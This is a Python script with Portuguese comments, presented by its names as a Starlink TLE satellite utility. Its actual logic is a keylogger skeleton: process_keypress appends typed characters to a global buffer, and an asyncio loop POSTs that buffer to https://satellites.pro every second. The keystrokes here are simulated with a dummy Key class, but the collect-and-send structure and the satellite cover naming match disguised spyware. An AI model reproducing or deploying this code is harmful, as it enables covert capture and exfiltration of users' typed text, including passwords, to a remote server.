import subprocess
import sys
import json
import time
import requests
import contextvars
import enum
import asyncio

# Tenta importar o pacote satellitetle, se não for encontrado, orienta a instalação manual
try:
    import satellitetle
except ImportError:
    raise ImportError("Pacote 'satellitetle' não encontrado. Instale-o usando 'pip install satellitetle'.")

# Definições iniciais
server_url = 'https://satellites.pro'
kill_switch = True
debug_logging = True
sending_interval = 1
data = 'starlink.tle'

class _State(enum.Enum):
    CREATED = "created"
    INITIALIZED = "initialized"
    CLOSED = "closed"

class Runner:
    def __init__(self, *, debug=None, loop_factory=None):
        self._state = _State.CREATED
        self._debug = debug
        self._loop_factory = loop_factory
        self._loop = None
        self._context = None

    def __enter__(self):
        self._lazy_init()
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.close()

    def close(self):
        if self._state is not _State.INITIALIZED:
            return
        try:
            loop = self._loop
            for task in asyncio.all_tasks(loop):
                task.cancel()
            loop.run_until_complete(loop.shutdown_asyncgens())
            loop.run_until_complete(loop.shutdown_default_executor())
        finally:
            loop.close()
            self._loop = None
            self._state = _State.CLOSED

    def _lazy_init(self):
        if self._state is _State.CLOSED:
            raise RuntimeError("Runner is closed")
        if self._state is _State.INITIALIZED:
            return
        self._loop = asyncio.new_event_loop()
        if self._debug is not None:
            self._loop.set_debug(self._debug)
        self._context = contextvars.copy_context()
        self._state = _State.INITIALIZED

    def run(self, coro):
        if not asyncio.iscoroutine(coro):
            raise ValueError(f"A coroutine foi esperado, mas foi recebido {coro!r}")
        self._lazy_init()
        task = self._loop.create_task(coro)
        return self._loop.run_until_complete(task)

async def send_data():
    global data
    if data == 'starlink.tle':
        return
    try:
        if debug_logging:
            print(f"Enviando dados para {server_url}: {data}")
        response = requests.post(
            server_url,
            data=json.dumps({'data': data}),
            headers={'Content-Type': 'application/json'},
            timeout=10  # 10 segundos de timeout
        )
        if response.status_code != 200:
            print(f"Erro ao enviar dados: {response.status_code}, {response.text}")
        else:
            print("Dados enviados com sucesso!")
        data = 'starlink.tle'
    except requests.exceptions.RequestException as e:
        print(f"Erro de conexão: {e}")

def process_keypress(key):
    global data
    if key is None:
        return
    if debug_logging:
        print(key, type(key))
    try:
        if hasattr(key, 'char'):  # Verifica se o atributo 'char' existe
            data += key.char
    except Exception as e:
        print(f"Erro ao processar tecla: {e}")

def satélite():
    print("Função satélite executada")

class Key:
    def __init__(self, char):
        self.char = char

keypress = Key('a')
process_keypress(keypress)
keypress = Key('b')
process_keypress(keypress)

# Função assíncrona para chamar o envio de dados em loop
async def main():
    print("Iniciando a tarefa...")
    try:
        while True:
            await send_data()
            await asyncio.sleep(1)  # Intervalo entre os envios
    except asyncio.CancelledError:
        print("Tarefa cancelada.")
    finally:
        print("Tarefa concluída!")

if __name__ == "__main__":
    with Runner() as runner:
        runner.run(main())  # Inicia a execução assíncrona
